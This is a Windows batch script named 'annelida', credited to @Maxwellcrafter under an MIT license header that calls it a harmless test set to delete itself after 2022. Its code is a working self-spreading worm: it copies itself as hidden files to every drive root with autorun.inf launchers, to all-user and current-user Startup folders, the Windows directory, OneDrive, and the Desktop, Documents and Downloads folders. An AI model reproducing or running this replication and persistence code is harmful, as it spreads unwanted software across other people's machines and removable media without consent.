set currentIteration=0 %= 2022-08-28 =% & goto begin

:begin
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                                               ::
::                                                                                                                               ::
::          Created by @Maxwellcrafter as a test of Batch's features. This does not do anything malicious besides exist          ::
::                                                  https://maxwellcrafter.com                                                   ::
::                  Source, documentation, and more can be found at https://github.com/Maxwell-Fisher/annelida                   ::
::                               a1cbdd7272ff08c2b23eadbd9b92fab96b13e3e6ab8238a47c63075afc9d6870                                ::
::                                                                                                                               ::
::                                                                                                                               ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                                               ::
::                                                                                                                               ::
::	The scipt will automatically delete itself after this year for safety.                                                   ::
	set allowedYear=2022
::                                                                                                                               ::
::                                                                                                                               ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                                                                                               ::
::                                                                                                                               ::
::                     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                      ::
::                     ::                                                                                ::                      ::
::                     :: MIT License                                                                    ::                      ::
::                     ::                                                                                ::                      ::
::                     :: Copyright (c) 2022 Maxwell Fisher (@Maxwellcrafter)                            ::                      ::
::                     ::                                                                                ::                      ::
::                     :: Permission is hereby granted, free of charge, to any person obtaining a copy   ::                      ::
::                     :: of this software and associated documentation files (the "Software"), to deal  ::                      ::
::                     :: in the Software without restriction, including without limitation the rights   ::                      ::
::                     :: to use, copy, modify, merge, publish, distribute, sublicense, and/or sell      ::                      ::
::                     :: copies of the Software, and to permit persons to whom the Software is          ::                      ::
::                     :: furnished to do so, subject to the following conditions:                       ::                      ::
::                     ::                                                                                ::                      ::
::                     :: The above copyright notice and this permission notice shall be included in all ::                      ::
::                     :: copies or substantial portions of the Software.                                ::                      ::
::                     ::                                                                                ::                      ::
::                     :: THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR     ::                      ::
::                     :: IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,       ::                      ::
::                     :: FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE    ::                      ::
::                     :: AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER         ::                      ::
::                     :: LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  ::                      ::
::                     :: OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE  ::                      ::
::                     :: SOFTWARE.                                                                      ::                      ::
::                     ::                                                                                ::                      ::
::                     ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                      ::
::                                                                                                                               ::
::                                                                                                                               ::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


@echo off
mode 17, 1
cls
setLocal enableDelayedExpansion

:: This stops the script from running and deletes it during any year other than what is allowed
echo "%date%" | find "%allowedYear%" > nul || del "%~f0"

set /a currentIteration=currentIteration+1

if not exist "%annelida.cmd%" move "%~f0" annelida.cmd


%= Copies to the root directory of all drives which have assigned letters =%
set alphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZ
set alphabetIndex=0
:driveCopyLoop
	if exist "!alphabet:~%alphabetIndex%,1!:" (
		if not exist "!alphabet:~%alphabetIndex%,1!:\annelida.cmd" (
			echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin >"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& type "%~f0">>"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& attrib +h "!alphabet:~%alphabetIndex%,1!:\annelida.cmd"
			if not exist "!alphabet:~%alphabetIndex%,1!:\autorun.inf" (
				echo [autorun]>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"& echo open=annelida.cmd>>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"
			)
		)
	)
	set /a alphabetIndex=alphabetIndex+1
if not "%alphabetIndex%" == "25" goto driveCopyLoop



if exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of all users =%
	if not exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
	)
)

if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of the current user =%
	if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
	)
)

if exist "%windir%" ( %= Copies to the root Windows directory of the current computer =%
	if not exist "%windir%\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%windir%\annelida.cmd"& type "%~f0" >> "%windir%\annelida.cmd"& attrib +h "%windir%\annelida.cmd"
	)
)

if exist "%onedrive%" ( %= Copies to the OneDrive of the current user =%
	if not exist "%onedrive%\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%onedrive%\annelida.cmd"& type "%~f0" >> "%onedrive%\annelida.cmd"& attrib +h "%onedrive%\annelida.cmd"
	)
)

if exist "%userprofile%\Desktop" ( %= Copies to the desktop of the current user =%
	if not exist "%userprofile%\Desktop\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%userprofile%\Desktop\annelida.cmd"& type "%~f0" >> "%userprofile%\Desktop\annelida.cmd"& attrib +h "%userprofile%\Desktop\annelida.cmd"
	)
)

if exist "%userprofile%\Documents" ( %= Copies to the documents of the current user =%
	if not exist "%userprofile%\Documents\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%userprofile%\Documents\annelida.cmd"& type "%~f0" >> "%userprofile%\Documents\annelida.cmd"& attrib +h "%userprofile%\Documents\annelida.cmd"
	)
)

if exist "%userprofile%\Downloads" ( %= Copies to the downloads of the current user =%
	if not exist "%userprofile%\Downloads\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%userprofile%\Downloads\annelida.cmd"& type "%~f0" >> "%userprofile%\Downloads\annelida.cmd"& attrib +h "%userprofile%\Downloads\annelida.cmd"
	)
)

if exist "%public%\Desktop" ( %= Copies to the desktop of all users =%
	if not exist "%public%\Desktop\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%public%\Desktop\annelida.cmd"& type "%~f0" >> "%public%\Desktop\annelida.cmd"& attrib +h "%public%\Desktop\annelida.cmd"
	)
)

if exist "%public%\Documents" ( %= Copies to the documents of all users =%
	if not exist "%public%\Documents\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%public%\Documents\annelida.cmd"& type "%~f0" >> "%public%\Documents\annelida.cmd"& attrib +h "%public%\Documents\annelida.cmd"
	)
)

if exist "%public%\Downloads" ( %= Copies to the downloads of all users =%
	if not exist "%public%\Downloads\annelida.cmd" (
		echo set currentIteration=%currentIteration% %%= %date% =%% ^& goto begin > "%public%\Downloads\annelida.cmd"& type "%~f0" >> "%public%\Downloads\annelida.cmd"& attrib +h "%public%\Downloads\annelida.cmd"
	)
)

exit
